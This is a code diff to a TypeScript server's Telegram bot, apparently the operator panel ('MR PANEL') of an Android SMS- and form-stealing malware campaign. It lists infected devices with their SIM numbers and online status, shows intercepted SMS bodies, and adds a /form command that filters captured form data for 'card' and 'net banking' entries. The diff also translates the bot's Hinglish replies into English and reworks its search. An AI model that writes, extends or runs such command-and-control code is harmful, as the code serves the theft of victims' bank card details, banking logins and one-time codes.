@@ -1435,20 +1435,20 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
   }
 
   function formatRecentData(msgs: unknown[], forms: unknown[], label: string): string {
-    let out = `⏱ <b>${label}</b>\n\n`;
-    if (msgs.length === 0 && forms.length === 0) return out + 'Koi data nahi mila.';
+    let out = `<b>${label}</b>\n\n`;
+    if (msgs.length === 0 && forms.length === 0) return out + 'No data found.';
     if (msgs.length > 0) {
-      out += `📩 <b>Messages (${msgs.length}):</b>\n`;
+      out += `Messages (${msgs.length}):\n`;
       (msgs as Array<Record<string,unknown>>).forEach(m => {
         const body = String(m.body ?? '').substring(0, 90);
-        out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${body}\n`;
+        out += `  [${m.app_id}] ${m.from_number}\n  ${body}\n`;
       });
     }
     if (forms.length > 0) {
-      out += `\n📋 <b>Form Data (${forms.length}):</b>\n`;
+      out += `\nForm Data (${forms.length}):\n`;
       (forms as Array<Record<string,unknown>>).forEach(f => {
         const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-        out += `• <code>${f.app_id}</code> | ${fields.substring(0, 100)}\n`;
+        out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
       });
     }
     return out;
@@ -1491,11 +1491,11 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         sqlClient(`SELECT COUNT(*) as c FROM messages`),
         sqlClient(`SELECT COUNT(*) as c FROM form_data`),
       ]);
-      const out = `📊 <b>Total Data (All Apps)</b>\n\n` +
-        `🔷 Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
-        `📱 Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
-        `📩 Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
-        `📋 Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
+      const out = `<b>Total Data (All Apps)</b>\n\n` +
+        `Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
+        `Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
+        `Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
+        `Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
@@ -1503,12 +1503,12 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     // /apps — list all apps
     if (txt === '/apps') {
       const rows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
-      let out = `🔷 <b>All Apps (${rows.length}):</b>\n\n`;
-      if (rows.length === 0) { out += 'Koi app nahi mila.'; }
-      rows.forEach(r => {
-        out += `${r.status === 'active' ? '🟢' : '🔴'} <code>${r.appId}</code> — ${r.name}\n`;
+      let out = `<b>All Apps (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'No apps found.'; }
+      rows.forEach(a => {
+        const st = a.status === 'active' ? '[active]' : '[inactive]';
+        out += `${st} <code>${a.appId}</code>  ${a.name ?? ''}\n`;
       });
-      out += `\n💡 /app &lt;appId&gt; — detail dekhne ke liye`;
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
@@ -1521,37 +1521,37 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;
 
       if (!appId) {
-        await tgReply(token, chatId, '❌ Usage: /app &lt;appId&gt; [deviceId] [searchText]');
+        await tgReply(token, chatId, 'Usage: /app &lt;appId&gt; [deviceId] [searchText]');
         return c.json({ ok: true });
       }
 
-      // ── Level 3: /app <appId> <deviceId> <searchText> — search within device ──
+      // Level 3: /app <appId> <deviceId> <searchText>
       if (deviceId && searchQuery) {
         const like = `%${searchQuery}%`;
         const [msgR, formR] = await Promise.all([
           sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 AND (LOWER(body) LIKE $3 OR LOWER(from_number) LIKE $3 OR LOWER(from_sender) LIKE $3) ORDER BY received_at DESC LIMIT 30`, [appId, deviceId, like]),
           sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 AND LOWER(data::text) LIKE $3 ORDER BY submitted_at DESC LIMIT 15`, [appId, deviceId, like]),
         ]);
-        let out = `🔍 <b>Search "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
-        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'Koi result nahi mila.'; }
+        let out = `<b>Search: "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
+        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'No results found.'; }
         if ((msgR as unknown[]).length > 0) {
-          out += `📩 <b>Messages (${(msgR as unknown[]).length}):</b>\n`;
+          out += `Messages (${(msgR as unknown[]).length}):\n`;
           (msgR as Array<Record<string,unknown>>).forEach(m => {
-            out += `• <b>${m.from_number}</b> (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
           });
         }
         if ((formR as unknown[]).length > 0) {
-          out += `\n📋 <b>Form Data (${(formR as unknown[]).length}):</b>\n`;
+          out += `\nForm Data (${(formR as unknown[]).length}):\n`;
           (formR as Array<Record<string,unknown>>).forEach(f => {
             const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
-            out += `• ${fields.substring(0, 120)}\n`;
+            out += `  ${fields.substring(0, 120)}\n`;
           });
         }
         await tgReply(token, chatId, out);
         return c.json({ ok: true });
       }
 
-      // ── Level 2: /app <appId> <deviceId> — show device's full data ──
+      // Level 2: /app <appId> <deviceId>
       if (deviceId) {
         const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
           db.select().from(devices).where(and(eq(devices.appId, appId), eq(devices.deviceId, deviceId))).limit(1),
@@ -1561,82 +1561,80 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
           sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
         ]);
         const dev = devRow[0];
-        let out = `📱 <b>Device: <code>${deviceId}</code></b>\n`;
+        let out = `<b>Device: <code>${deviceId}</code></b>\n`;
         if (dev) {
-          const st = dev.status === 'online' ? '🟢 Online' : '⚫ Offline';
-          out += `${st} | <b>${dev.name}</b>\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '—'} | SIM2: ${dev.sim2Phone ?? '—'}\n`;
+          const st = dev.status === 'online' ? '[Online]' : '[Offline]';
+          out += `${st} ${dev.name}\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '-'} | SIM2: ${dev.sim2Phone ?? '-'}\n`;
         }
-        out += `\n📩 Messages: <b>${(msgCount[0] as {c:string}).c}</b> | 📋 Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
+        out += `\nMessages: <b>${(msgCount[0] as {c:string}).c}</b> | Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
         if ((msgRows as unknown[]).length > 0) {
-          out += `\n📩 <b>Recent Messages:</b>\n`;
+          out += `\nRecent Messages:\n`;
           (msgRows as Array<Record<string,unknown>>).forEach(m => {
-            out += `• <b>${m.from_number}</b> (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
           });
         }
         if ((formRows as unknown[]).length > 0) {
-          out += `\n📋 <b>Recent Form Data:</b>\n`;
+          out += `\nRecent Form Data:\n`;
           (formRows as Array<Record<string,unknown>>).forEach(f => {
             const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
-            out += `• ${fields.substring(0, 120)}\n`;
+            out += `  ${fields.substring(0, 120)}\n`;
           });
         }
-        out += `\n💡 Search: /app ${appId} ${deviceId} &lt;text&gt;`;
+        out += `\nSearch: /app ${appId} ${deviceId} &lt;text&gt;`;
         await tgReply(token, chatId, out);
         return c.json({ ok: true });
       }
 
-      // ── Level 1: /app <appId> — list devices ──
+      // Level 1: /app <appId> — list devices
       const [devRows, msgCount, formCount] = await Promise.all([
         db.select().from(devices).where(eq(devices.appId, appId)).orderBy(desc(devices.updatedAt)).limit(20),
         sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [appId]),
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [appId]),
       ]);
-      let out = `🔷 <b>App: <code>${appId}</code></b>\n`;
-      out += `📩 ${(msgCount[0] as {c:string}).c} msgs | 📋 ${(formCount[0] as {c:string}).c} forms\n\n`;
-      if (devRows.length === 0) { out += 'Koi device nahi mila.'; }
+      let out = `<b>App: <code>${appId}</code></b>\n`;
+      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
+      if (devRows.length === 0) { out += 'No devices found.'; }
       else {
-        out += `📱 <b>Devices (${devRows.length}):</b>\n`;
+        out += `Devices (${devRows.length}):\n`;
         devRows.forEach(d => {
-          const st = d.status === 'online' ? '🟢' : '⚫';
-          out += `${st} <b>${d.name}</b>\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '—'} | SIM2: ${d.sim2Phone ?? '—'}\n`;
+          const st = d.status === 'online' ? '[ON]' : '[OFF]';
+          out += `${st} ${d.name}\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
         });
-        out += `\n💡 Device detail: /app ${appId} &lt;deviceId&gt;`;
+        out += `\nDevice detail: /app ${appId} &lt;deviceId&gt;`;
       }
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
-    // /search <text> — search + pause notifications
+    // /search <text> — search last 200 records only (no notification pause)
     if (txt.startsWith('/search ')) {
       const query = txt.slice(8).trim().toLowerCase();
       if (!query) {
-        await tgReply(token, chatId, '❌ Usage: /search &lt;text&gt;');
+        await tgReply(token, chatId, 'Usage: /search &lt;text&gt;');
         return c.json({ ok: true });
       }
-      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
       const like = `%${query}%`;
       const [msgR, formR] = await Promise.all([
-        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 OR LOWER(app_id) LIKE $1 ORDER BY received_at DESC LIMIT 25`, [like]),
-        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE $1 OR LOWER(app_id) LIKE $1 ORDER BY submitted_at DESC LIMIT 15`, [like]),
+        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM (SELECT * FROM messages ORDER BY received_at DESC LIMIT 200) sub WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 LIMIT 20`, [like]),
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM (SELECT * FROM form_data ORDER BY submitted_at DESC LIMIT 200) sub WHERE LOWER(data::text) LIKE $1 LIMIT 10`, [like]),
       ]);
-      let out = `🔍 <b>Search: "${query}"</b>\n🔕 <i>Notifications paused — /stop se resume karo</i>\n\n`;
+      let out = `<b>Search: "${query}"</b>  (last 200 records)\n\n`;
       if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) {
-        out += 'Koi result nahi mila.';
+        out += 'No results found.';
       }
       if ((msgR as unknown[]).length > 0) {
-        out += `📩 <b>Messages (${(msgR as unknown[]).length}):</b>\n`;
+        out += `Messages (${(msgR as unknown[]).length}):\n`;
         (msgR as Array<Record<string,unknown>>).forEach(m => {
-          out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${String(m.body).substring(0, 90)}\n`;
+          out += `  [${m.app_id}] ${m.from_number}\n  ${String(m.body).substring(0, 90)}\n`;
         });
       }
       if ((formR as unknown[]).length > 0) {
-        out += `\n📋 <b>Form Data (${(formR as unknown[]).length}):</b>\n`;
+        out += `\nForm Data (${(formR as unknown[]).length}):\n`;
         (formR as Array<Record<string,unknown>>).forEach(f => {
           const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
-          out += `• <code>${f.app_id}</code> | ${fields.substring(0, 100)}\n`;
+          out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
         });
       }
-      out += `\n\n▶️ /stop — notifications resume karne ke liye`;
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
@@ -1649,13 +1647,51 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       return c.json({ ok: true });
     }
 
-    // /online — all currently online devices
+    // /online — devices active in last 15 min
     if (txt === '/online') {
-      const rows = await db.select().from(devices).where(eq(devices.status, 'online')).orderBy(asc(devices.appId)).limit(50);
-      let out = `🟢 <b>Online Devices (${rows.length})</b>\n\n`;
-      if (rows.length === 0) { out += 'Koi device online nahi hai.'; }
-      rows.forEach(d => {
-        out += `📱 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  ID: <code>${d.deviceId}</code>\n  SIM: ${d.sim1Phone ?? '—'}\n`;
+      const cutoff = new Date(Date.now() - 15 * 60 * 1000).toISOString();
+      const rows = await sqlClient(`SELECT device_id, name, app_id, last_online, updated_at FROM devices WHERE (last_online > $1::timestamptz OR (status = 'online' AND updated_at > $1::timestamptz)) ORDER BY COALESCE(last_online, updated_at) DESC LIMIT 50`, [cutoff]);
+      let out = `<b>Online Devices — Last 15 Min (${(rows as unknown[]).length})</b>\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No devices active in last 15 minutes.'; }
+      (rows as Array<Record<string,unknown>>).forEach(d => {
+        const t = d.last_online
+          ? new Date(String(d.last_online)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' })
+          : '—';
+        out += `ID: <code>${d.device_id}</code>\n  ${d.name} | App: <code>${d.app_id}</code> | Last: ${t}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /form [filter] — form data with filter
+    if (txt === '/form' || txt.startsWith('/form ')) {
+      const arg = txt.slice(5).trim().toLowerCase();
+      let whereClause = '';
+      let filterLabel = 'All';
+      if (arg === 'card') {
+        whereClause = `AND LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`;
+        filterLabel = 'Card';
+      } else if (arg === 'net banking' || arg === 'netbanking' || arg === 'nb') {
+        whereClause = `AND LOWER(data::text) LIKE '%net banking%'`;
+        filterLabel = 'Net Banking';
+      } else if (arg === 'card online' || arg === 'card with online') {
+        whereClause = `AND LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`;
+        filterLabel = 'Card + Online';
+      } else if (arg === 'net banking online' || arg === 'nb online' || arg === 'netbanking online') {
+        whereClause = `AND LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`;
+        filterLabel = 'Net Banking + Online';
+      } else if (arg === 'all online' || arg === 'online') {
+        whereClause = `AND LOWER(data::text) LIKE '%online%'`;
+        filterLabel = 'All + Online';
+      }
+      const formRows = await sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE 1=1 ${whereClause} ORDER BY submitted_at DESC LIMIT 40`);
+      let out = `<b>Form Data — ${filterLabel} (${(formRows as unknown[]).length})</b>\n`;
+      out += `Filters: card | net banking | all | card online | nb online | all online\n\n`;
+      if ((formRows as unknown[]).length === 0) { out += 'No form data found for this filter.'; }
+      (formRows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}: ${v}`).join(' | ');
+        const t = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : '—';
+        out += `${i+1}. [${f.app_id}] [${f.device_id}]\n   ${fields.substring(0, 150)}\n   ${t}\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
@@ -1664,11 +1700,11 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     // /offline — all offline devices
     if (txt === '/offline') {
       const rows = await db.select().from(devices).where(eq(devices.status, 'offline')).orderBy(desc(devices.updatedAt)).limit(30);
-      let out = `⚫ <b>Offline Devices (${rows.length})</b>\n\n`;
-      if (rows.length === 0) { out += 'Sab devices online hain!'; }
+      let out = `<b>Offline Devices (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'All devices are online!'; }
       rows.forEach(d => {
         const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
-        out += `📵 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
+        out += `${d.name}\n  ID: <code>${d.deviceId}</code> | App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
@@ -1678,7 +1714,7 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt.startsWith('/dev ')) {
       const devId = txt.slice(5).trim();
       if (!devId) {
-        await tgReply(token, chatId, '❌ Usage: /dev &lt;deviceId&gt;');
+        await tgReply(token, chatId, 'Usage: /dev &lt;deviceId&gt;');
         return c.json({ ok: true });
       }
       const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
@@ -1689,29 +1725,28 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
       ]);
       if (!devRow[0]) {
-        await tgReply(token, chatId, `❌ Device <code>${devId}</code> nahi mila.`);
+        await tgReply(token, chatId, `Device <code>${devId}</code> not found.`);
         return c.json({ ok: true });
       }
       const d = devRow[0];
-      const st = d.status === 'online' ? '🟢 Online' : '⚫ Offline';
-      let out = `📱 <b>${d.name}</b> [${st}]\n`;
+      const st = d.status === 'online' ? '[Online]' : '[Offline]';
+      let out = `<b>${d.name}</b> ${st}\n`;
       out += `App: <code>${d.appId}</code> | User: ${d.userId}\n`;
-      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '—'} | SIM2: ${d.sim2Phone ?? '—'}\n`;
-      out += `📩 ${(msgCount[0] as {c:string}).c} msgs | 📋 ${(formCount[0] as {c:string}).c} forms\n\n`;
+      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
+      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
       if ((msgRows as unknown[]).length > 0) {
-        out += `📩 <b>Recent Messages:</b>\n`;
+        out += `Recent Messages:\n`;
         (msgRows as Array<Record<string,unknown>>).forEach(m => {
-          out += `• <b>${m.from_number}</b>: ${String(m.body).substring(0, 100)}\n`;
+          out += `  ${m.from_number}: ${String(m.body).substring(0, 80)}\n`;
         });
       }
       if ((formRows as unknown[]).length > 0) {
-        out += `\n📋 <b>Recent Form Data:</b>\n`;
+        out += `\nRecent Forms:\n`;
         (formRows as Array<Record<string,unknown>>).forEach(f => {
-          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
-          out += `• ${fields.substring(0, 120)}\n`;
+          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+          out += `  ${fields.substring(0, 120)}\n`;
         });
       }
-      out += `\n💡 Detail: /app ${d.appId} ${devId}`;
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
@@ -1720,10 +1755,10 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     if (txt.startsWith('/last')) {
       const n = Math.min(parseInt(txt.split(' ')[1] ?? '10', 10) || 10, 50);
       const rows = await sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages ORDER BY received_at DESC LIMIT $1`, [n]);
-      let out = `📩 <b>Last ${n} Messages (All Apps)</b>\n\n`;
-      if ((rows as unknown[]).length === 0) { out += 'Koi message nahi mila.'; }
-      (rows as Array<Record<string,unknown>>).forEach(m => {
-        out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${String(m.body).substring(0, 90)}\n`;
+      let out = `<b>Last ${n} Messages</b>\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No messages found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((m, i) => {
+        out += `${i+1}. [${m.app_id}] ${m.from_number}\n   ${String(m.body).substring(0, 90)}\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
@@ -1732,49 +1767,60 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
     // /stats — per-app breakdown
     if (txt === '/stats') {
       const appRows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
-      let out = `📊 <b>Per-App Stats</b>\n\n`;
+      let out = `<b>Per-App Stats</b>\n\n`;
       const results = await Promise.all(appRows.map(async a => {
-        const [d, m, f] = await Promise.all([
+        const [dC, mC, fC] = await Promise.all([
           sqlClient(`SELECT COUNT(*) as c FROM devices WHERE app_id=$1`, [a.appId]),
           sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [a.appId]),
           sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [a.appId]),
         ]);
-        return { ...a, d: (d[0] as {c:string}).c, m: (m[0] as {c:string}).c, f: (f[0] as {c:string}).c };
+        return { ...a, d: (dC[0] as {c:string}).c, m: (mC[0] as {c:string}).c, f: (fC[0] as {c:string}).c };
       }));
       results.forEach(r => {
-        const st = r.status === 'active' ? '🟢' : '🔴';
-        out += `${st} <code>${r.appId}</code>\n  📱${r.d} | 📩${r.m} | 📋${r.f}\n`;
+        const st = r.status === 'active' ? '[ON]' : '[OFF]';
+        out += `${st} <code>${r.appId}</code>\n  Devices: ${r.d} | Msgs: ${r.m} | Forms: ${r.f}\n`;
       });
       await tgReply(token, chatId, out);
       return c.json({ ok: true });
     }
 
     // /stop — resume notifications
-  
     if (txt === '/stop' || txt === '/release') {
       await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
-      await tgReply(token, chatId, '▶️ <b>Notifications resumed!</b>\nAb se phir se notifications aayengi. 🔔');
+      await tgReply(token, chatId, '<b>Notifications resumed.</b>\nAll notifications are now active.');
       return c.json({ ok: true });
     }
 
-    // /start or /help
+    // /start or /help — command menu
     if (txt === '/start' || txt === '/help') {
-      const help = `🤖 <b>MR ROBOT Bot Commands</b>\n\n` +
-        `⏱ /1h — Last 1 hour ka data\n` +
-        `⏱ /24h — Last 24 hours ka data\n` +
-        `⏱ /7d — Last 7 days ka data\n` +
-        `📩 /last [n] — Last N messages (default 10)\n` +
-        `📊 /total — Total counts\n` +
-        `📊 /stats — Per-app breakdown\n` +
-        `🟢 /online — Online devices\n` +
-        `⚫ /offline — Offline devices\n` +
-        `🔷 /apps — Sabhi App IDs\n` +
-        `🔷 /app &lt;appId&gt; — App devices\n` +
-        `🔷 /app &lt;appId&gt; &lt;devId&gt; — Device data\n` +
-        `🔷 /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt; — Device search\n` +
-        `📱 /dev &lt;deviceId&gt; — Quick device lookup\n` +
-        `🔎 /search &lt;text&gt; — Global search (notifications pause)\n` +
-        `▶️ /stop — Notifications resume\n`;
+      const help =
+        `<b>MR PANEL — Command Menu</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `<b>[DATA BY TIME]</b>\n` +
+        `1.  /1h              Last 1 hour data\n` +
+        `2.  /24h             Last 24 hours data\n` +
+        `3.  /7d              Last 7 days data\n\n` +
+        `<b>[MESSAGES & FORMS]</b>\n` +
+        `4.  /last [n]        Last N messages (default 10)\n` +
+        `5.  /form [filter]   Form data by filter\n` +
+        `    card | net banking | all\n` +
+        `    card online | nb online | all online\n` +
+        `6.  /search &lt;text&gt;   Search last 200 records\n\n` +
+        `<b>[DEVICES]</b>\n` +
+        `7.  /online          Active in last 15 min\n` +
+        `8.  /offline         Offline devices\n` +
+        `9.  /dev &lt;id&gt;        Device quick lookup\n\n` +
+        `<b>[APPS]</b>\n` +
+        `10. /apps            All App IDs\n` +
+        `11. /app &lt;appId&gt;     App devices\n` +
+        `12. /app &lt;appId&gt; &lt;devId&gt;        Device data\n` +
+        `13. /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt;  Search device\n\n` +
+        `<b>[STATS]</b>\n` +
+        `14. /total           Total counts (all apps)\n` +
+        `15. /stats           Per-app breakdown\n\n` +
+        `<b>[CONTROL]</b>\n` +
+        `16. /stop            Resume notifications\n` +
+        `17. /start           Show this menu`;
       await tgReply(token, chatId, help);
       return c.json({ ok: true });
     }
